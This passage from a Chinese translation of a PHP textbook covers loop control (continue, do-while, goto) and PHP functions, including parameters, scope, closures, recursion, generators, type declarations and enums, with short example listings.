- 8. 如果模数（即除以 2 的整数余数）等于 0，则满足除以 2 的可整除性。此测试使用频率相当高。注意：此简单测试也会将 0 识别为偶数！

```
continue;
}
$i++;
echo " odd number";
}
?>
```

清单 5.32 "continue" 的用法（"continue.php"）

与 break 类似，continue 也可以赋予一个数值，在嵌套循环或 switch 语句的情况下，该数值告诉你继续哪个循环。以下示例使用两个嵌套循环说明了这一点（参见图 5.27）。

```
<?php
for ($i = 1; $i <= 10; $i++) {
    echo "Row $i: ";
    $j = 1;
    while (true) {
        echo $j * $i . " ";
        $j++;
        if ($j > 5) {
            echo "<br />";
            continue 2;
        }
    }
}
?>
```

清单 5.33 带数字说明的 "continue"（"continue_number.php"）

break 和 continue 与其他循环类型的工作方式与此处解释的完全相同。在实践中，它们最常与 while 一起使用。

![](img/ae7820c36e8f24c1623d26668b28e80e_156_0.png)

图 5.27 乘法表系列，最高到乘以 5

## 注意

当在循环中使用 switch 的结构中使用时，不带关联循环编号的 continue 将从 PHP 7.3 开始生成警告（参见图 5.28），因为只有 switch 会退出，而循环不会退出。

![](img/ae7820c36e8f24c1623d26668b28e80e_157_0.png)

图 5.28 在 "switch" 中使用 "continue" 时的警告

因此，这里存在无限循环的风险。

```
<?php
$i = 1;
while ($i < 10) {
    switch ($i) {
        case $i < 5:
            echo "Nothing ...<br />";
            continue;
        case $i >= 5:
            echo "$i<br />";
    }
    $i++;
}
?>
```

清单 5.34 带 "switch" 的 "continue"（"switch_continue.php"）

### 5.3.3 "do-while"

此处要介绍的最后一种循环类型是 do-while。原则上，它的工作方式与 while 循环相同，唯一的例外是条件始终在循环执行后检查。这意味着语句至少执行一次：

```
do {
    statements;
} while (condition)
```

以下示例显示通常的循环，输出 1 到 9 的数字。

```
<?php
    $i = 1;
    do {
        echo "$i<br />";
        $i++;
    } while ($i < 10)
?>
```

清单 5.35 "do-while" 循环（"dowhile.php"）

到目前为止，与正常 while 循环没有可观察到的偏差。只有在一开始条件就不满足时，它才变得不寻常。在这种情况下，语句块至少执行一次。

```
$i = 11;
do {
echo "$i<br />";
$i++;
} while ($i < 10)
```

清单 5.36 "do-while" 的特殊特性（"dowhile_once.php"）

在示例中，do-while 至少输出一次 11（参见图 5.29），尽管条件不满足。此行为很少需要，但如果你确实需要，请记住 do-while 循环。

![](img/ae7820c36e8f24c1623d26668b28e80e_158_0.png)

图 5.29 虽然条件不满足，"do-while" 仍输出一次 "11"

> 注意
> do-while 没有短形式，但你可以将 break 和 continue 与 do-while 一起使用。

### 5.4 跳转

代码流中的跳转是 PHP 中不常用的功能。`goto` 运算符在 PHP 5.3 中引入，使用非常简单：插入一个标记。名称可自由选择，并加上冒号。然后使用 `goto tag` 调用标记名称。中间的所有代码都被跳过。在以下示例中，输出 1 被忽略，然后显示输出 2（参见图 5.30）。

```
<?php
 goto marker;
 echo 'output 1';

 marker:
 echo 'output 2';
 ?>
```

清单 5.37 通过 "goto" 跳转（"goto.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_159_0.png)

图 5.30 仅显示第二个输出。

> **注意**
> 
> goto 不允许跳转到循环或 switch case 区分。这将生成一个致命错误。

# 第 6 章

# 函数和语言结构

*函数是编程中将经常使用的功能捆绑在一起的最简单方法。*

*函数* 简单来说，是语句的集合。你可以自己编写这些集合，或者它们由 PHP 或无数 PHP 扩展之一提供。

*语言结构* 与 PHP 指定的函数非常相似。但是，在语言结构中，可以省略函数典型的圆括号。

## 6.1 函数

函数使用简单。需要两个步骤：

- 必须定义函数（也称为*声明*它）。对于 PHP 函数，不需要此操作；它已在那里定义。
- 然后必须调用函数，因为只有在调用时才会执行它。

要定义函数，请使用 函数 关键字：

```
function Name() {
  statements;
}
```

*函数* 关键字后跟函数名。圆括号是函数的特征。参数也放在这里（第 6.1.1 节）。花括号包含语句。你已经从 case 区分和循环中熟悉这种语句块类型。要调用函数，请使用其名称和圆括号：

```
Name();
```

在以下简单示例中，函数在调用时输出一条记录（参见图 6.1）。

```
<?php
function output() {
  echo "This is a function.";
}
```





```php
output();
?>
```

列表 6.1 简单函数 ("function.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_162_0.png)

图 6.1 函数的输出

> **注意**
> 函数名遵循与变量名相同的规则，但不区分大小写。否则，它们只能由字母、数字和下划线组成，并且必须以字母或下划线开头。

### 6.1.1 参数

函数类似于黑盒。功能包含在函数内的语句中。外部调用者不需要知道语句究竟长什么样，但应该能够向函数传递信息。这通过参数实现。

你在函数的圆括号之间编写参数。参数名被视作变量名，在函数内可用：

```
function Name($Parametername1, $Parametername2) {
 statements;
}
```

当你调用函数时，必须为参数传递值：

```
Name(Value1, Value2);
```

以下是一个小示例。下面的脚本接收两个参数。然后输出这些参数。调用时为参数传递两个字符串（见图 6.2）。

```
<?php
 function output($par1, $par2) {
 echo "Parameter 1: $par1<br />";
 echo "Parameter 2: $par2";
 }
output("Hello", "World");
?>
```

列表 6.2 向函数传递参数 ("function_parameters.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_163_0.png)

图 6.2 输出参数

**注意**

从 PHP 7.3 开始，解析器允许在函数和方法调用中在最后指定的参数后加上逗号——即所谓的尾随逗号。因此，以下调用不会导致解析错误，尽管看起来相当丑陋：

`output("Hello", "World",);`

从 PHP 8 开始，在定义方法和函数的参数时也允许这样做：

`function output($par1, $par2,) {`

即使它看起来仍然不太漂亮，但它允许你简单地复制和粘贴长参数列表（这些列表可以分布在多行上），使生活更加灵活。

### 默认值

如果不确定是否总是为参数传递值，也可以为参数指定默认值。

```
<?php
function output($par = "Default") {
    echo "Parameter value: $par<br />";
}

output();
output("Exclusive");
?>
```

列表 6.3 参数的默认值 ("function_default.php")

然后，每次在未提供相应值的情况下调用函数时，都会使用默认值（见图 6.3）。默认值可以是值或常量。你也可以将默认值设置为 NULL，即没有值。这意味着，如果在调用函数时未设置参数值，但参数本身也未设置，则不会发生错误。1 你可以使用这种结构来模拟一种*重载*——即传递不同数量的参数。但这实际上只是一种辅助结构。

![](img/ae7820c36e8f24c1623d26668b28e80e_164_0.png)

图 6.3 默认值出现在顶部，传递的值出现在底部

> **注意**
> 如果使用多个参数，必须将带有默认值的参数写在最后：
> 
> ```php
> function output($par1, $par2 = "Default2") {
>   echo "Parameter value 1: $par1<br />";
>   echo "Parameter value 2: $par2";
> }
> 
> output("Exclusive1");
> ```
> 
> 如果你记得 PHP 需要知道传递的参数应用于哪个变量，这很合理。

### 灵活数量的参数

默认值是向函数传递过少参数的唯一方法。你可以使用 ... 运算符（*展开运算符*）传递过多参数。它放在最后一个参数之前，并将所有传递的参数作为一个数组。

... 运算符只能用于函数的最后一个参数。但是，可以在它之前轻松插入一个或多个其他参数。这些参数也可以有默认值。

> **注意**
> 传递过多参数通常被称为*重载*。但是，面向对象意义上的重载意味着针对不同数量的参数提供不同的函数。情况并非如此。

1 此处未设置是指使用 isset() 进行测试失败。关于这一点将在 6.19 节中详细介绍。

下一个列表显示了一个示例。

```
<?php
function flexible($a, ...$params) {
    $elements = count($params);
    echo $elements . '<br />';
    echo $params[0] + $params[2];
}
flexible(0, 1, 2, 3);
?>
```

列表 6.4 使用 ... 运算符捕获多个参数 ("function_flexible_parameters.php")

调用函数时传递四个参数。第一个值 0 是已定义参数 $a 的值。其他三个参数在 $params 中创建为数组。由于这是一个普通数组，你可以使用 count() 数组函数来确定元素数量（见图 6.4），并使用索引访问各个参数值。

![](img/ae7820c36e8f24c1623d26668b28e80e_165_0.png)

图 6.4 参数数量和简单算术运算的结果

但是，在早期的 PHP 版本中，已经可以使用过多参数。相关函数自 PHP 4 起就存在，并且仍然有效：

- func_num_args() 作为返回值返回传递元素的数量——与是否存在相应参数无关。因此，以下脚本输出 1。

```
function func() {
    $elements = func_num_args();
    echo $elements;
}
func("Test");
```

列表 6.5 元素数量 ("function_func_num_args.php")

- func_get_args() 返回一个包含传递参数的数组。以下脚本使用索引 0 从数组中读取第一个也是唯一的参数。

```
function func() {
$elements = func_get_args();
echo $elements[0];
}
func("Test");
```

列表 6.6 带元素的数组 ("function_func_get_args.php")

- func_get_arg(index) 允许你直接访问元素，而无需经过数组。该函数返回用索引标记的元素的值。第一个参数的索引为 0。

```
function func() {
$element = func_get_arg(0);
echo $element;
}
func("Test");
```

列表 6.7 直接访问参数 ("function_func_get_arg.php")

### 命名参数

命名参数或命名属性是 PHP 8 引入的一个新选项，可在调用函数时直接为单个参数赋值，而无需遵循指定顺序或定义直到所需参数的所有可选参数。

后者通过 PHP 8 新增功能中使用的 htmlspecialchars() PHP 函数的示例来说明。在文档中，该函数有四个属性：

```
htmlspecialchars ( string $string , int $flags = ENT_COMPAT | ENT_HTML401 ,
string $encoding = ini_get("default_charset") , bool $double_encode = true ) :
string
```

如果你现在想更改 htmlspecialchars() 的第四个参数，但不更改之前的两个参数，那么只需直接使用命名参数访问第四个参数 $double_encode：

```
htmlspecialchars($string, double_encode: false);
```

为此，我们写不带 $ 的参数变量名，并在冒号后写入参数的值。需要遵循的唯一顺序是：先是未命名参数，然后是命名参数。当然，没有默认值的必填参数不能缺少。

此应用示例在已经由 PHP 定义的函数的上下文中使用命名参数。但是，同样的方法也适用于你自己的函数以及对象的方法。为此，只需以经典方式使用变量定义函数：

```
function output($par1, $par2, $par3 = 'Default value') {
```

调用函数时，先按函数中定义的顺序定义未命名参数。因此，值 hello 对应于 $par1。然后按灵活顺序跟随命名参数：

```
output("Hello", par3: "World", par2: "New");
```

下一个列表显示完整代码。

```
function output($par1, $par2, $par3 = 'Default value') {
 echo "Parameter 1: $par1<br />";
 echo "Parameter 2: $par2<br />";
 echo "Parameter 3: $par3";
}
output("Hello", par3: "World", par2: "New");
```

列表 6.8 命名参数 ("function_named_parameters.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_167_0.png)

图 6.5 使用命名参数的输出：此处调用顺序无关紧要

> 注意
> 当然，命名参数允许在函数调用中随意交换参数。但是，这不利于清晰的代码结构。重点更多在于不必不必要地定义可选参数，而是只干净地传递要更改的值。

### 6.1.2 变量作用域

函数内的变量称为局部变量，因为它们仅在此函数中适用。函数外的变量称为全局变量。在 PHP 中，它们仅在函数外适用（见图 6.6）。

```
<?php
$global = "Global";
function output() {
```





$global = "Global-Local";
$local = "Local";
echo "$global $local<br />";
}
output();
echo $global . $local;
?>

### 清单 6.9 变量的有效性 ("function_validity.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_168_0.png)

### 图 6.6 局部变量仅在函数内部有效，全局变量仅在外部有效

### "global"

如果要在函数中使用全局变量，必须使用 global 关键字显式定义它。这样 PHP 解释器就知道必须获取该全局变量（参见图 6.7）。

```php
<?php
$global = "Global variable";
function output() {
global $global;
echo $global;
}
output();
?>
```

### 清单 6.10 全局变量 ("function_global.php")

> **注意**
> 一旦设置，你也可以更改全局变量的值。但是，在实际中很少使用带 global 的全局变量。

![](img/ae7820c36e8f24c1623d26668b28e80e_169_0.png)

### 图 6.7 你现在可以在函数中访问全局变量。

### $GLOBALS

$GLOBALS 数组包含所有全局变量。你可以使用它从任何地方访问全局变量或更改其值。

```php
<?php
$global = "Global variable";
function output() {
echo $GLOBALS["global"];
}
output();
?>
```

### 清单 6.11 "$GLOBALS" 数组 ("function_globalsArray.php")

### 6.1.3 返回值

使用参数，你可以将值传递给函数。要从函数中获取返回值，需要使用 return 关键字。它会终止函数；也就是说，return 之后的所有语句都会被忽略。return 处的值会被返回。

```
function Name(Parameter) {
Statements;
return ReturnValue;
}
```

然后你需要对这个返回值做些什么。当然，你可以立即输出它。但是，你通常会将其保存在一个变量中：

```
$Variable = Name(Parameter);
```

> **注意**
> 任何使用过 Pascal 编程的人都知道确切的区别。没有返回值的函数实际上是一个 _过程_。有些语言为过程和函数使用不同的关键字（例如，Visual Basic）。但在 PHP 中，这种区别没有意义。这就是为什么我们通常称之为 _函数_。

下一个清单展示了一个简单示例。函数接收一个参数，添加一个字符串，并返回它。然后输出返回值。

```php
<?php
function output($par) {
    return "Hello $par";
}
$return = output("world");
echo $return;
?>
```

### 清单 6.12 带返回值的函数 ("function_return.php")

**提示**
函数（尤其是带有返回值的函数）只有在包含更复杂的语句并且被多次使用时，才能发挥其全部效用。

### 多个返回值

使用 `return`，你只能接收一个返回值。通常使用数组来获取多个值。你将在第 8 章了解更多关于数组的内容。以下示例生成一个乘法系列，并将其作为数组返回（参见图 6.8）。

![](img/ae7820c36e8f24c1623d26668b28e80e_170_0.png)

### 图 6.8 作为数组的乘法系列

```php
<?php
function multiplication($a) {
    $products = [];
    for ($i = 1; $i <= 10; $i++) {
        $products[$i] = $a * $i;
    }
    return $products;
}
$result = multiplication(2);
foreach ($result as $ele) {
    echo "$ele<br />";
}
?>
```

### 清单 6.13 函数将数组作为返回值返回 ("function_array.php")

### 返回引用

你可以将函数的返回值作为引用接收。为此，请在函数名和调用函数时输入 & 符号。²

```php
<?php
$authors = ["tobias", "christian"];

function &return(&$authors, $i) {
    print_r($authors);
    print "<br />";
    return $authors[$i];
}

$author = &return($authors, 1); //$author == "christian"
$author = "wolfgang"; //$author == "wolfgang"
print_r($authors);
?>
```

### 清单 6.14 作为引用的返回 ("function_reference.php")

如果你从函数中接收较大的数组或对象，这种变体很有用。因为只传递引用，而不传递数组或对象本身（参见图 6.9），因此这种方法可以提高性能。

![](img/ae7820c36e8f24c1623d26668b28e80e_171_0.png)

### 图 6.9 当函数以引用方式调用时，数组的第二个元素会发生变化

² 也可以将参数作为引用传递给函数。但是，在较新的 PHP 版本中，不再推荐这样做，并且会发出警告。

### 6.1.4 变量中的函数名

PHP 中经常提到的一种选择是³。你可以将函数名保存在变量中，然后像原始函数调用一样使用它们。这里有一个示例：函数名为 output()，并期望一个参数。你可以将函数名保存在变量中，然后使用圆括号（甚至必要的参数）来调用该变量。

```php
<?php
function output($par) {
    echo "Hello $par";
}
$functionname = "output";
$functionname("PHP 8.3");
?>
```

### 清单 6.15 函数名存储在变量中 ("function_variables.php")

**注意**

要测试变量是否包含可调用的函数，可以使用 is_callable(Variable) 函数。它返回一个布尔值。

尽管此功能非常令人兴奋，但它有两个缺点：首先，性能会受到一定影响，因为 PHP 总是要先检查带有圆括号的变量是否是函数。其次——这是更严重的缺点——由于这种结构，代码会变得相当令人困惑。因此，此功能在实际中仅在特殊情况下使用，例如在使用单独的函数通过 usort() 进行排序时。

### 6.1.5 匿名函数

匿名函数（也称为闭包）是——顾名思义——没有名称的函数。此类匿名函数可在其他函数调用中定义，也可以赋值给变量。以下示例将匿名函数赋给变量 $output，随后可随时再次调用。

```php
<?php
$output = function($parameter) {
    echo 'My ' . $parameter . '<br />';
};

$output('Output 1');
$output('Output 2');
?>
```

### 清单 6.16 匿名函数的使用 ("anonymous_functions.php")

³ 通常带有不同的名称，例如变量函数。

> **注意**
> 如前所述，匿名函数可以用于其他函数调用。在那里，它们是所谓的回调函数。一个示例是使用 `usort()` 进行排序。但是，匿名函数也可以通过 `call_user_func()` 在函数调用中使用。

![](img/ae7820c36e8f24c1623d26668b28e80e_173_0.png)

### 图 6.10 匿名函数的输出

匿名函数也可以在其他函数内部使用。在这种情况下，可以使用 use 关键字将变量分配给匿名函数，这些变量随后在函数内部可用。

```php
<?php
function output($separator) {
    $address = 'My ';
    $func = function($parameter) use ($address, $separator) {
        echo $address . $parameter . $separator;
    };

    $func('Output 1');
    $func('Output 2');
}

output('<br />');
?>
```

### 清单 6.17 匿名函数中的变量 ("anonymous_functions_variables.php")

> **提示**
> 使用 `func_num_args()`、`func_get_arg()` 和 `func_get_args()` 重载函数的选项在匿名函数中也可用。

> **注意**
> 自 PHP 5.6 起，use 也可用于函数和常量。自 PHP 5.4 起，你也可以在闭包中使用 `$this`，但前提是匿名方法是类的一部分。

### 6.1.6 递归函数

递归函数是调用自身的函数。例如，递归函数可以以类似于循环的方式使用。这意味着函数调用位于函数内部。但是，你仍然需要一个变化，否则使用递归函数会产生无限循环。

以下脚本使用递归函数计算阶乘⁴（参见图 6.11）。

```php
<?php
function factorial($i) {
    if ($i > 0) {
        return $i * factorial($i-1);
    } else {
        return 1;
    }
}
echo factorial(5);
?>
```

### 清单 6.18 使用递归函数计算阶乘 ("function_recursive.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_174_0.png)

### 图 6.11 5 的阶乘是 120

你也可以使用循环达到相同的结果，如下一个示例所示。

```
$result = 1;
for ($i = 5; $i > 0; $i--) {
    $result *= $i;
}
echo $result;
```

### 清单 6.19 计算阶乘的循环 ("loop_factorial.php")

在某些情况下，递归函数被认为很优雅，许多计算机科学家非常欣赏递归编程。但是，它通常更难读懂——尤其是对于没有编写该脚本的人。

⁴ 阶乘也通常写作 n!，并用 n * (n - 1) * (n - 2) * ... * 1 进行计算。例如，阶乘用于组合数学。





## 生成器

生成器基本上是用于 `foreach` 循环的函数，它们不是只返回一次，而是返回多次。与使用 `return` 不同，这里使用 `yield` 关键字。

以下示例定义了一个在起始数字和结束数字之间添加数字的函数。增量可以通过单独的参数选择。循环的所有部分结果都通过 yield 返回。

```php
<?php
function add($start, $end, $step = 1) {
 if ($start < $end) {
  $result = 0;
  for ($i = $start; $i <= $end; $i += $step) {
   $result += $i;
   yield $result;
  }
 }
}

foreach (add(2, 10, 2) as $result) {
 echo $result . '<br />';
}
?>
```

列表 6.20 用于迭代的生成器（"function_generator.php"）

在示例中，结果直接输出（参见图 6.12）。但是，它们也可以直接用于填充数组，例如。生成器的优势在于，您可以在不必将所有数据存储在数组的情况下遍历数据。后者在大量数据下可能会占用工作内存。

![](img/ae7820c36e8f24c1623d26668b28e80e_175_0.png)

图 6.12 此处可观看加法过程

## 静态变量

局部变量——即仅在函数内存在的变量——在每次调用函数时都会被重置。这就是为什么在上一节的阶乘示例中，计数器必须作为参数传递。但是，您也可以使用 `static` 关键字将局部变量创建为静态变量。在这种情况下，变量的值在每次函数调用后都会保留。阶乘也可以不带参数实现，如下一个示例所示。

```php
<?php
function factorial() {
static $i = 3;
if ($i > 0) {
return $i-- * factorial();
} else {
return 1;
}
}
echo factorial();
?>
```

列表 6.21 用于阶乘的静态变量（"function_static.php"）

> **注意**
> 在 PHP 中，静态变量在编译期间处理。因此，静态变量可以将另一个变量的值作为引用接收。在这种情况下，原始变量会相应更改。

### 6.1.7 类型声明

类型声明允许您为函数参数和函数返回值指定固定数据类型。自 PHP 7 以来，其中大部分内容都是新的：从 PHP 7 开始，标量数据类型——int、float、string 和 bool——可用于函数参数。在此之前，已经可以通过名称指定类和接口、数组（array）、用于可调用函数的 callable 等等。

为返回值指定数据类型在 PHP 7 中是全新的。它们在函数名称后由冒号分隔。以下示例为每个参数和返回值定义了整数。PHP 默认执行类型转换。

```php
<?php
function sum(int ...$a): int {
return array_sum($a);
}

$result = sum(1, '2', 3.7);

var_dump($result);
?>
```

列表 6.22 参数和返回值的类型声明（"typedeclaration.php"）

> **注意**
> 从 float 到 int 的类型转换不是舍入，而是丢弃小数位！因此已弃用。

![](img/ae7820c36e8f24c1623d26668b28e80e_177_0.png)

图 6.13 多亏了类型转换，输出返回值为 "6" 的整数——但也显示了已弃用

如果您更改先前显示的脚本，并为参数和返回值使用 `float` 而不是 `int`，则 6.7 将作为 `float` 输出（参见图 6.14）：

```php
function sum(float ...$a): float {
    return array_sum($a);
}
```

![](img/ae7820c36e8f24c1623d26668b28e80e_177_1.png)

图 6.14 如果为参数和返回值指定了 "float"，则结果为 "6.7"

## 严格类型

默认情况下，PHP 会自动转换类型。但是，这有时会导致您自己编程中的错误，在调试时很难找到。出于此原因，也可以坚持使用严格类型处理。此设置通过 declare() 函数进行。在下一个示例中，strict_types 的值设置为 1。

```php
<?php
declare(strict_types=1);

function sum(float ...$a): string {
    return array_sum($a);
}

$result = sum(1, '2', 3.7);
var_dump($result);
?>
```

列表 6.23 带有严格检查的错误（"typedeclaration_error.php"）

此脚本中存在各种错误。首先，第二个参数是字符串；其次，返回值未正确声明为字符串。但是，PHP 只会报告第一个类型错误（参见图 6.15）。因此，"抛出" 的错误是 TypeError 类型的致命错误。

![](img/ae7820c36e8f24c1623d26668b28e80e_178_0.png)

图 6.15 "TypeError" 首先跳转到错误的参数类型

## 敏感参数

敏感参数在 PHP 8.2 中是新增的。它们防止输出函数参数，例如在调试消息中。此函数旨在处理关键或个人数据，如密码。这些参数应被标记，然后不再在错误消息中输出。

参数通过在各自参数之前指定 #[SensitiveParameter] 来标记（另请参见第 11 章，第 11.4.12 节，其中将此概念引入面向对象编程）。以下示例分别展示了使用和不使用该参数的情况。当然，此示例中的错误本身是构造的。

```php
<?php
function password_edit(string $password): string {
   throw new Exception('Error');
   return md5($password);
}
try {
   $result = password_edit("Secret password");
} catch (Exception $e) {
   echo $e;
}

echo '<br /><br />';

function password_edit_secure(#[SensitiveParameter] string $password): string
{
   throw new Exception('Error');
   return md5($password);
}
try {
   $result = password_edit_secure("Secret password");
} catch (Exception $e) {
   echo $e;
}
?>
```

列表 6.24 使用敏感参数（"sensitive_parameters.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_179_0.png)

图 6.16 顶部的错误消息中显示了密码，底部被覆盖

## 无返回值 Void

如果函数没有返回值，自 PHP 7.1 以来，类型也可以为 void。在这种情况下，函数既不能使用 return，也只能使用空的 return（参见图 6.17）。

```php
<?php
function output(string $a): void {
    echo $a;
    return;
}

$result = output('output<br />');
var_dump($result);
?>
```

列表 6.25 带有 Void 的返回（"typedeclaration_void.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_180_0.png)

图 6.17 函数返回——类型正确——什么都不返回

> **注意**
> 使用 return null; 返回 null 值与 void 类型不兼容；会导致致命错误。

## 带 Null 的类型声明

自 PHP 7.1 以来，可以为函数进行类型声明，其返回可以是指定类型或 null。为此，? 在类型之前使用。

```php
<?php
function sum(int ...$a): ?int {
    $result = array_sum($a);
    if ($result > 3) {
        return $result;
    } else {
        return null;
    }
}
$result = sum(1, 2);
var_dump($result);
?>
```

列表 6.26 类型声明中考虑了 "null" 情况（"typedeclaration_null.php"）

输出结果不是错误，而是字符串 NULL 的输出。

> **注意**
> 自 PHP 8.2 以来，null、false 和 true 也是函数返回的独立数据类型选项。

## 联合类型

联合类型是单类型的扩展，自 PHP 8 起已内置。单类型无非是只有一个类型的类型声明，例如 int 或 float。相应地，联合类型仅由多个类型组成，例如 int 和 float。不同的类型在表示中仅通过 | 彼此分隔。

要测试此功能，您应该启用严格类型：

```php
declare(strict_types=1);
```

在函数声明中，我们为可能的参数选择三种不同的数据类型——int、float 和 string。返回值则使用 int 和 float 数据类型：

```php
function sum(int|string|float ...$a): int|float {
    return array_sum($a);
}
```

在示例中，我们在调用中还混合了所有三种允许的类型：

```php
$result = sum(1, '2', 3.7);
```

输出最终显示为 float。完整示例如下列表所示。

```php
declare(strict_types=1);
function sum(int|string|float ...$a): int|float {
    return array_sum($a);
}
$result = sum(1, '2', 3.7);
var_dump($result);
```

列表 6.27 使用不同类型的类型声明（"union_type.php"）




注意

自 PHP 8 起，已经可以在联合类型声明中定义 `null` 作为类型之一。这是前一节中带有前导 `?` 的类型声明的语法替代方案。这意味着 `int|null` 对应于 `?int`。

## 交叉类型和 DNF 类型

PHP 8.1 引入了交叉类型，而析范式（DNF）类型则是在 PHP 8.2 中新增的，它们扩展了联合类型的功能。

交叉类型并非用于字符串、整数等标量类型，而仅用于类类型。它们允许使用与号（`&`）将不同的类类型组合起来以检查类型：

```
function functionname(): type1&type2 {
```

DNF 类型从 PHP 8.2 版本开始支持将联合类型和交叉类型相结合。在这里，交叉类型是联合类型中的几个选项之一。在下面的示例中，函数的返回值可以是整数、字符串，也可以是 `type1` 或 `type2` 的对象：

```
function functionname(): (type1&type2)|int|string {
```

以下示例摘录自完整脚本。

```
function sum(int|string|float ...$a): (type1&type2)|int|float {
```

**清单 6.28 DNF 类型允许混合使用（“dnf_types.php”）**

### 使用 mixed 进行类型声明

`mixed` 类型是在 PHP 8 中新增的，用于在你无法或不想指定类型，但仍要进行类型声明时使用。

基本上，`mixed` 的意思无非是这里可以传递或返回任何类型。如果你将其写成联合类型，则会如下所示：

```
array|bool|callable|int|float|object|resource|string|null
```

下面的示例演示了在我们的参数求和示例函数中如何使用。

```
function sum(mixed ...$a): mixed {
    return array_sum($a);
}

$result = sum(1, '2', 3.7);
var_dump($result);
```

**清单 6.29 使用不同类型进行类型声明（“type_declaration_mixed.php”）**

**提示**

由于 PHP 8 会在省略类型声明时自动允许任何类型，因此问题来了：mixed 究竟有何必要？其背后有一个根本性决定：如果你始终使用类型声明，仍然有时会出现无法或不想指定类型的情况。在这种情况下，使用 mixed 来专门标记这些情况。

### 使用 never 进行类型声明

`never` 类型是在 PHP 8.1 中新增的，是一种纯返回类型，用于指示函数不会结束，因此不返回任何内容。这意味着函数必须通过 exit() 退出，或者产生无限循环或异常。

```
<?php
function output(string $a): never {
    echo $a;
    exit();
}
$result = output('output');
?>
```

**清单 6.30 使用 "never" 进行函数返回类型声明（“never.php”）**

**注意**

如果前面的脚本中缺少 exit()，则结果将是致命错误。

### 6.1.8 枚举

枚举（通常简称为 enums）是一种列表，用于指定参数、返回值或其他类型的数据可以取哪些值。在开发中，它们也在数据库层级出现，用于描述数据字段可以取哪些值。枚举从 PHP 8.1 版本开始提供。它们主要用于面向对象开发，但也可用于函数类型。

表示方法非常简单。关键字是 enum，后跟名称。单个值使用 case 关键字声明：

```
enum values
{
    case case1;
    case case2;
    case case3;
    case case4;
}
```

然后使用双冒号表示法访问值：

```
$value = values::case3;
```

完整用法如下所示。枚举作为相应函数参数的类型在函数调用中指定：

```
function output(values $parameter) {
```

然后可以在函数中使用该参数。在下面的简单示例中，switch case 区分访问各个值并在每种情况下执行输出。

```
<?php
enum values
{
    case case1;
    case case2;
    case case3;
    case case4;
}
```

```
function output(values $parameter) {
switch ($parameter) {
    case values::case1:
        echo "case1";
        break;
    case values::case2:
        echo "case2";
        break;
    ...
}
}
```

```
$value = values::case3;
output($value);
?>
```

**清单 6.31 枚举定义固定值（“enumerations.php”）**

### 带标量值的枚举

枚举也可与标量值结合使用，其技术术语为 backed enums。在这里，整数或字符串被赋值给枚举作为值。

当使用枚举转换数据库或导入中的数据字段时，这总是很实用，因为那里的数据字段通常具有简单的标量值。

声明同样简单。枚举会补充一个类型声明——即 int 或 string。你在各个 case 中定义值：

```
enum values : int
{
    case case1 = 1;
    case case2 = 2;
    case case3 = 3;
    case case4 = 4;
}
```

要使用标量值访问正确的 case，PHP 为枚举提供了两个方法：

- `from(value)` 返回与标量值匹配的枚举 case。如果值不存在，PHP 会抛出 ValueError。
- `tryFrom(value)` 基本上做同样的事情，只是在值不存在时返回零。因此，如果例如数据源也可能提供不可靠的值，并且需要实现单独的错误处理函数，那么此变体非常合适。

在下面的示例中，输出 case2。

```
<?php
enum values : int
{
    case case1 = 1;
    case case2 = 2;
    case case3 = 3;
    case case4 = 4;
}

function output(values $parameter) {
    ...
}

$value = values::from(2);

output($value);
?>
```

**清单 6.32 带标量值的枚举（“enumerations_scalar.php”）**

### 6.1.9 有用和实用的信息

本节汇总了一些不时需要的有趣帮助函数和代码片段。

### 测试函数

如果你使用函数，也应该检查函数是否存在，尤其是对于更大的脚本。如果你使用库中的外部函数，这一点也很重要。

最简单的方法如下所示：

```
if (output()) {
    echo output();
}
```

不幸的是，如果函数不存在，此检查会失败（参见图 6.18）。在这方面，这是不可接受的。

![](img/ae7820c36e8f24c1623d26668b28e80e_186_0.png)

图 6.18 函数不存在

使用 `function_exists(function_name)` 辅助函数进行检查效果更好。它将函数名作为参数并返回一个布尔值。在下面的行中，仅在函数存在时才执行该函数：

```
if (function_exists("output")) {
    echo output();
}
```

**提示**

也可以使用字符串的精确相等来测试数据类型：

```
if (function_exists("output") && output() == "") {
    echo output();
}
```

### "isset()"

你已经对变量中的 isset(Parameter) 函数很熟悉了。它检查变量是否已声明。你也可以在函数内部对函数的参数使用此函数。对于值为 NULL（无值）的参数，isset() 将其视为未设置，因此返回 false。另一方面，空字符串（“”）是已设置的。

```
function output($par = NULL) {
    if (isset($par)) {
        return "Hello $par";
    } else {
        return "Hello without parameters";
    }
}
$return = output();
echo $return;
```

**清单 6.33 “isset()”（“isset.php”）**

前面的脚本返回 "hello without parameters"，因为参数未设置，因此使用默认值 NULL。

> **注意**
> 注意：如果默认值未设置为 NULL，则 PHP 解释器会生成警告，因为参数不存在！

### "create_function()"

create_function(parameters, statements) 辅助函数仅在 PHP 7.3 及以下版本中可用。在 PHP 8 中，它已被废弃，因为匿名函数提供了有用的替代方案。这意味着即使在旧版 PHP 中，也最好不要使用它。

如果你在旧代码中遇到此函数，通常会在动态创建不带函数名的函数时看到它的使用（参见图 6.19）。这种过程也称为 _lambda 样式_。当代码或参数需要在程序执行期间（运行时）更改时，动态创建的函数非常有用。

```
<?php
$function = create_function('$par', 'echo "Hello " . $par;');
$function("World");
?>
```

**清单 6.34 “create_function()”（“create_function.php”）**





![](img/ae7820c36e8f24c1623d26668b28e80e_188_0.png)

### 图 6.19 动态生成函数的输出

### "call_user_func()"

call_user_func(函数名, 参数1, 参数2) 辅助函数用于调用函数。

```php
function difference($a, $b) {
   return $a - $b;
}
echo call_user_func("difference", 5, 2);
```

清单 6.35 "call_user_func()" ("call_user_func.php")

前面的脚本输出正确的结果。call_user_func() 主要用于需要动态生成参数的情况。

此外，还存在 call_user_func_array(函数名, 参数数组)。使用这个辅助函数时，所有参数都存储在数组中，而不是用逗号分隔。

### 6.1.10 PHP 的函数

PHP 的功能主要体现在函数中。因此，PHP 文档中最重要的部分是 _函数参考_。您可以在文档中找到它，也可以直接访问 _http://php.net/manual/funcref.php_。迄今为止介绍的、有助于处理自定义函数的函数，也可以在函数参考中找到（参见图 6.20）。

> **注意**
>
